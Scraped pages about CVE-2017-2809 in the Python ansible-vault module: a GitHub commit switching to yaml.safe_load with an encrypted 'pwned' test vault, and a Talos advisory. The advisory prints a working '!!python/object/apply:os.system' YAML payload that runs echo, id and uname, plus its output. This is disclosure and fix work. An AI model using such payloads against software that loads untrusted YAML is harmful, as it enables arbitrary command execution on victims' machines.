=== Content from github.com_cf3f4943_20250124_221952.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftomoh1r%2Fansible-vault%2Fcommit%2F3f8f659ef443ab870bb19f95d43543470168ae04)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftomoh1r%2Fansible-vault%2Fcommit%2F3f8f659ef443ab870bb19f95d43543470168ae04)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=tomoh1r%2Fansible-vault)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[tomoh1r](/tomoh1r)
/
**[ansible-vault](/tomoh1r/ansible-vault)**
Public

* [Notifications](/login?return_to=%2Ftomoh1r%2Fansible-vault) You must be signed in to change notification settings
* [Fork
  32](/login?return_to=%2Ftomoh1r%2Fansible-vault)
* [Star
   54](/login?return_to=%2Ftomoh1r%2Fansible-vault)

* [Code](/tomoh1r/ansible-vault)
* [Issues
  6](/tomoh1r/ansible-vault/issues)
* [Pull requests
  4](/tomoh1r/ansible-vault/pulls)
* [Discussions](/tomoh1r/ansible-vault/discussions)
* [Actions](/tomoh1r/ansible-vault/actions)
* [Wiki](/tomoh1r/ansible-vault/wiki)
* [Security](/tomoh1r/ansible-vault/security)
* [Insights](/tomoh1r/ansible-vault/pulse)

Additional navigation options

* [Code](/tomoh1r/ansible-vault)
* [Issues](/tomoh1r/ansible-vault/issues)
* [Pull requests](/tomoh1r/ansible-vault/pulls)
* [Discussions](/tomoh1r/ansible-vault/discussions)
* [Actions](/tomoh1r/ansible-vault/actions)
* [Wiki](/tomoh1r/ansible-vault/wiki)
* [Security](/tomoh1r/ansible-vault/security)
* [Insights](/tomoh1r/ansible-vault/pulse)

## Commit

[Permalink](/tomoh1r/ansible-vault/commit/3f8f659ef443ab870bb19f95d43543470168ae04)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix security issue refs [#4](https://github.com/tomoh1r/ansible-vault/issues/4)

[Browse files](/tomoh1r/ansible-vault/tree/3f8f659ef443ab870bb19f95d43543470168ae04)
Browse the repository at this point in the history

```
* Update version to 1.0.5
* Update to use yaml.safe_load()
* Update to tomoh1r
```

* Loading branch information

[![@tomoh1r](https://avatars.githubusercontent.com/u/613861?s=40&v=4)](/tomoh1r)

[tomoh1r](/tomoh1r/ansible-vault/commits?author=tomoh1r "View all commits by tomoh1r")
committed
Sep 13, 2017

1 parent
[1ae50a3](/tomoh1r/ansible-vault/commit/1ae50a312349656280fbe7d2acfbda9c1d560dd1)

commit 3f8f659

 Show file tree

 Hide file tree

Showing
**10 changed files**
with
**55 additions**
and
**29 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* .travis.yml
  [.travis.yml](#diff-6ac3f79fc25d95cd1e3d51da53a4b21b939437392578a35ae8cd6d5366ca5485)
* CHANGES.txt
  [CHANGES.txt](#diff-59130575b4fb2932c957db2922977d7d89afb0b2085357db1a14615a2fcad776)
* README.rst
  [README.rst](#diff-7b3ed02bc73dc06b7db906cf97aa91dec2b2eb21f2d92bc5caa761df5bbc168f)
* README\_test.rst
  [README\_test.rst](#diff-86d82b866a9a3b5520d61824a75253f1a1ff3e05b58fd4bb469feb18bfc8563e)
* ansible\_vault

  + ansible\_vault/api.py
    [api.py](#diff-ff58fe67cacb24c6ba7eeec1f7fd2c2839f4a5f4adee167bd5bd7d7d143ebe9e)
  + test

    - file

      * ansible\_vault/test/file/pwned.txt
        [pwned.txt](#diff-8bb14ab048772953de09536d7cc462bec2455fedcfec8828dea6a409a5c7d9cf)
    - ansible\_vault/test/test\_api.py
      [test\_api.py](#diff-47dd16a697438037e6053ca1a9e1cce62d0eb6afcad1a6c69c1c7da9e1d9e925)
* setup.cfg
  [setup.cfg](#diff-fa602a8a75dc9dcc92261bac5f533c2a85e34fcceaff63b3a3a81d9acde2fc52)
* setup.py
  [setup.py](#diff-60f61ab7a8d1910d86d9fda2261620314edcae5894d5aaa236b821c7256badd7)
* tox.ini
  [tox.ini](#diff-ef2cef9f88b4fe09ca3082140e67f5ad34fb65fb6e228f119d3812261ae51449)

## There are no files selected for viewing

20 changes: 13 additions & 7 deletions

20
[.travis.yml](#diff-6ac3f79fc25d95cd1e3d51da53a4b21b939437392578a35ae8cd6d5366ca5485 ".travis.yml")

Show comments

[View file](/tomoh1r/ansible-vault/blob/3f8f659ef443ab870bb19f95d43543470168ae04/.travis.yml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,14 +1,20 @@ |
|  |  | --- |
|  |  | language: python |
|  |  | sudo: false |
|  |  | cache: |
|  |  | directories: |
|  |  | - $HOME/.cache/pip |
|  |  | python: |
|  |  | - 2.7 |
|  |  | env: |
|  |  | matrix: |
|  |  | - TOXENV=py27 |
|  |  | - TOXENV=py27-ansible2 |
|  |  | - "2.7" |
|  |  | - "3.3" |
|  |  | - "3.4" |
|  |  | - "3.5" |
|  |  | - "3.6" |
|  |  | install: |
|  |  | - pip install tox |
|  |  | script: tox |
|  |  | - python -m pip install -U setuptools pip |
|  |  | - python setup.py setup\_test |
|  |  | script: |
|  |  | - python -m pytest |
|  |  | - if [ "$TRAVIS\_PYTHON\_VERSION" == '2.7' ] ; then python -m pip install -U 'ansible<2.0.0' && python -m pytest ; fi |
|  |  |  |
|  |  | # vim:st=2 sts=2 sw=2: |

10 changes: 10 additions & 0 deletions

10
[CHANGES.txt](#diff-59130575b4fb2932c957db2922977d7d89afb0b2085357db1a14615a2fcad776 "CHANGES.txt")

Show comments

[View file](/tomoh1r/ansible-vault/blob/3f8f659ef443ab870bb19f95d43543470168ae04/CHANGES.txt)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -1,3 +1,13 @@ |
|  |  | 1.0.5 (2017/09/13) |
|  |  |  |
|  |  | \* Update to use yaml.safe\_load()$ |
|  |  | \* Update to tomoh1r$ |
|  |  |  |
|  |  | 1.0.4 (2015/11/29) |
|  |  |  |
|  |  | \* Apply to Ansible 2 |
|  |  | \* Add unit tests |
|  |  |  |
|  |  | 1.0.3 (2015/05/18) |
|  |  |  |
|  |  | \* fix README.rst typo |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[README.rst](#diff-7b3ed02bc73dc06b7db906cf97aa91dec2b2eb21f2d92bc5caa761df5bbc168f "README.rst")

Show comments

[View file](/tomoh1r/ansible-vault/blob/3f8f659ef443ab870bb19f95d43543470168ae04/README.rst)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -2,8 +2,8 @@ |
|  |  | ansible-vault |
|  |  | ============= |
|  |  |  |
|  |  | .. image:: https://travis-ci.org/jptomo/ansible-vault.svg?branch=master |
|  |  | :target: https://travis-ci.org/jptomo/ansible-vault |
|  |  | .. image:: https://travis-ci.org/tomoh1r/ansible-vault.svg?branch=master |
|  |  | :target: https://travis-ci.org/tomoh1r/ansible-vault |
|  |  |  |
|  |  | This project aim to R/W an ansible-vault yaml file |
|  |  |  |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[README\_test.rst](#diff-86d82b866a9a3b5520d61824a75253f1a1ff3e05b58fd4bb469feb18bfc8563e "README_test.rst")

Show comments

[View file](/tomoh1r/ansible-vault/blob/3f8f659ef443ab870bb19f95d43543470168ae04/README_test.rst)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -12,4 +12,5 @@ how to test |
|  |  |  |
|  |  | .. code-block:: console |
|  |  |  |
|  |  | $ ./venvtest/bin/python setup.py setup\_test |
|  |  | $ ./venvtest/bin/python setup.py test |

2 changes: 1 addition & 1 deletion

2
[ansible\_vault/api.py](#diff-ff58fe67cacb24c6ba7eeec1f7fd2c2839f4a5f4adee167bd5bd7d7d143ebe9e "ansible_vault/api.py")

Show comments

[View file](/tomoh1r/ansible-vault/blob/3f8f659ef443ab870bb19f95d43543470168ae04/ansible_vault/api.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -15,7 +15,7 @@ def \_\_init\_\_(self, password): |
|  |  |  |
|  |  | def load(self, stream): |
|  |  | '''read vault steam and return python object''' |
|  |  | return yaml.load(self.vault.decrypt(stream)) |
|  |  | return yaml.safe\_load(self.vault.decrypt(stream)) |
|  |  |  |
|  |  | def dump(self, data, stream=None): |
|  |  | '''encrypt data and print stdout or write to stream''' |
| Expand Down | |  |

7 changes: 7 additions & 0 deletions

7
[ansible\_vault/test/file/pwned.txt](#diff-8bb14ab048772953de09536d7cc462bec2455fedcfec8828dea6a409a5c7d9cf "ansible_vault/test/file/pwned.txt")

Show comments

[View file](/tomoh1r/ansible-vault/blob/3f8f659ef443ab870bb19f95d43543470168ae04/ansible_vault/test/file/pwned.txt)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -0,0 +1,7 @@ |
|  |  | $ANSIBLE\_VAULT;1.1;AES256 |
|  |  | 31616433623434626463363932323936663066353063393731346536636437633463633137643032 |
|  |  | 3663656431663830396662646132343735623538346330640a363532326262353732636161633431 |
|  |  | 61353936346235396464333333653831356638393264343662363362653433353762396663653465 |
|  |  | 6439366430336336660a363931663030323665633136363362353162333864653933653763656462 |
|  |  | 31656431653333343834623731393263393865353831333963616165613237376630646665306363 |
|  |  | 6238373037663462343565643737303136333032386136356438 |

10 changes: 8 additions & 2 deletions

10
[ansible\_vault/test/test\_api.py](#diff-47dd16a697438037e6053ca1a9e1cce62d0eb6afcad1a6c69c1c7da9e1d9e925 "ansible_vault/test/test_api.py")

Show comments

[View file](/tomoh1r/ansible-vault/blob/3f8f659ef443ab870bb19f95d43543470168ae04/ansible_vault/test/test_api.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,9 +1,9 @@ |
|  |  | import os |
|  |  | from tempfile import mkstemp |
|  |  |  |
|  |  | from testfixtures import ShouldRaise |
|  |  |  |
|  |  | from ansible.errors import AnsibleError |
|  |  | from testfixtures import ShouldRaise |
|  |  | from yaml.constructor import ConstructorError |
|  |  |  |
|  |  |  |
|  |  | here = os.path.dirname(os.path.abspath(\_\_file\_\_)) |
| Expand All | | @@ -28,6 +28,12 @@ def test\_cannot(self): |
|  |  | with ShouldRaise(AnsibleError('Decryption failed')): |
|  |  | vault.load(open(fpath).read()) |
|  |  |  |
|  |  | def test\_not\_pwned(self): |
|  |  | fpath = os.path.join(here, 'file', 'pwned.txt') |
|  |  | vault = self.\_makeOne('password') |
|  |  | with ShouldRaise(ConstructorError): |
|  |  | vault.load(open(fpath).read()) |
|  |  |  |
|  |  |  |
|  |  | class TestVaultDump(object): |
|  |  | def \_getTargetClass(self): |
| Expand Down | |  |

8 changes: 8 additions & 0 deletions

8
[setup.cfg](#diff-fa602a8a75dc9dcc92261bac5f533c2a85e34fcceaff63b3a3a81d9acde2fc52 "setup.cfg")

Show comments

[View file](/tomoh1r/ansible-vault/blob/3f8f659ef443ab870bb19f95d43543470168ae04/setup.cfg)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,2 +1,10 @@ |
|  |  | [metadata] |
|  |  | description-file = README.rst |
|  |  |  |
|  |  | [aliases] |
|  |  | setup\_test = develop easy\_install ansible-vault[test] |
|  |  | release = register clean --all sdist |
|  |  |  |
|  |  | [tools:pytest] |
|  |  | norecursedirs = venv |
|  |  | testpaths = ansible\_vault/test |

8 changes: 5 additions & 3 deletions

8
[setup.py](#diff-60f61ab7a8d1910d86d9fda2261620314edcae5894d5aaa236b821c7256badd7 "setup.py")

Show comments

[View file](/tomoh1r/ansible-vault/blob/3f8f659ef443ab870bb19f95d43543470168ae04/setup.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -32,19 +32,21 @@ def run\_tests(self): |
|  |  |  |
|  |  | setup( |
|  |  | name='ansible-vault', |
|  |  | version='1.0.4', |
|  |  | version='1.0.5', |
|  |  | author='Tomohiro NAKAMURA', |
|  |  | author\_email='quickness.net@gmail.com', |
|  |  | url='https://github.com/jptomo/ansible-vault', |
|  |  | url='https://github.com/tomoh1r/ansible-vault', |
|  |  | description='R/W an ansible-vault yaml file', |
|  |  | long\_description=\_read('README.rst'), |
|  |  | packages=find\_packages(), |
|  |  | install\_requires=['ansible'], |
|  |  | tests\_require=['pytest', 'testfixtures'], |
|  |  | cmdclass={'test': PyTest}, |
|  |  | classifiers=[ |
|  |  | 'Development Status :: 5 - Production/Stable', |
|  |  | 'License :: OSI Approved :: GNU General Public License v3 (GPLv3)', |
|  |  | ], |
|  |  | license='GPLv3', |
|  |  | extras\_require = { |
|  |  | 'test': ['pytest', 'testfixtures'], |
|  |  | } |
|  |  | ) |

14 changes: 0 additions & 14 deletions

14
[tox.ini](#diff-ef2cef9f88b4fe09ca3082140e67f5ad34fb65fb6e228f119d3812261ae51449 "tox.ini")

Show comments

[View file](/tomoh1r/ansible-vault/blob/1ae50a312349656280fbe7d2acfbda9c1d560dd1/tox.ini)
Edit file

Delete file

Load diff

This file was deleted.

Oops, something went wrong.

Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `3f8f659`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftomoh1r%2Fansible-vault%2Fcommit%2F3f8f659ef443ab870bb19f95d43543470168ae04) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.talosintelligence.com_ff46b207_20250124_221954.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

×

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2017-0305

## ansible-vault Yaml Load Code Execution Vulnerability

##### September 14, 2017

##### CVE Number

CVE-2017-2809

### Summary

An exploitable vulnerability exists in the yaml loading functionality of ansible-vault. A specially crafted vault can execute arbitrary python commands resulting in command execution. An attacker can insert python into the vault to trigger this vulnerability.

### Tested Versions

ansible-vault 1.0.4

### Product URLs

<https://pypi.python.org/pypi/ansible-vault/1.0.4>

### CVSSv3 Score

7.5 - CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H

### CWE

CWE-502 - Deserialization of Untrusted Data

### Details

Ansible provides an easy solution for automating IT and network based tasks. The 3rd party python module, ansible-vault provides an encrypted format to contain potential secrets related to the automation.

```
api.py:9
class Vault(object):
    '''R/W an ansible-vault yaml file'''

    def __init__(self, password):
        self.password = password
        self.vault = VaultLib(password)

    def load(self, stream):
        '''read vault steam and return python object'''
        return yaml.load(self.vault.decrypt(stream)) [0]

```

ansible-vault is leveraging the unsafe API `yaml.load` [0] for loading the yaml it decrypts. This yaml can contain a python directive to execute arbitrary commands.

### Exploit Proof-of-Concept

An example vault is shown below that, when loaded, will execute an arbitary command:

```
$ ansible-vault view pwned
Vault password:
!!python/object/apply:os.system ["echo 'Hi from Talos!'; id; uname -a"]

```

A quick test leveraging the ansible-vault API shows the commands being executed:

```
(ansible) user in ~
$ ipython
In [1]: from ansible_vault import Vault
In [2]: v = Vault('password')
In [3]: v.load(open('pwned').read())

Hi from Talos!
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),112(lpadmin),113(sambashare)
Linux fuzz0 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

```
### Mitigation

Replace `yaml.load` with `yaml.safe_load`

### Timeline

2017-04-07 - Vendor Disclosure

2017-09-14 - Public Release

##### Credit

Discovered by Cory Duplantis of Cisco Talos. Talos would also like to thank Dylan Ayrey for his collaboration.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2017-0458](/vulnerability_reports/TALOS-2017-0458) [Previous Report

TALOS-2017-0317](/vulnerability_reports/TALOS-2017-0317)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)



=== Content from github.com_83b6ca81_20250124_221951.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftomoh1r%2Fansible-vault%2Fblob%2Fv1.0.5%2FCHANGES.txt)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftomoh1r%2Fansible-vault%2Fblob%2Fv1.0.5%2FCHANGES.txt)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=tomoh1r%2Fansible-vault)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[tomoh1r](/tomoh1r)
/
**[ansible-vault](/tomoh1r/ansible-vault)**
Public

* [Notifications](/login?return_to=%2Ftomoh1r%2Fansible-vault) You must be signed in to change notification settings
* [Fork
  32](/login?return_to=%2Ftomoh1r%2Fansible-vault)
* [Star
   54](/login?return_to=%2Ftomoh1r%2Fansible-vault)

* [Code](/tomoh1r/ansible-vault/tree/v1.0.5)
* [Issues
  6](/tomoh1r/ansible-vault/issues)
* [Pull requests
  4](/tomoh1r/ansible-vault/pulls)
* [Discussions](/tomoh1r/ansible-vault/discussions)
* [Actions](/tomoh1r/ansible-vault/actions)
* [Wiki](/tomoh1r/ansible-vault/wiki)
* [Security](/tomoh1r/ansible-vault/security)
* [Insights](/tomoh1r/ansible-vault/pulse)

Additional navigation options

* [Code](/tomoh1r/ansible-vault/tree/v1.0.5)
* [Issues](/tomoh1r/ansible-vault/issues)
* [Pull requests](/tomoh1r/ansible-vault/pulls)
* [Discussions](/tomoh1r/ansible-vault/discussions)
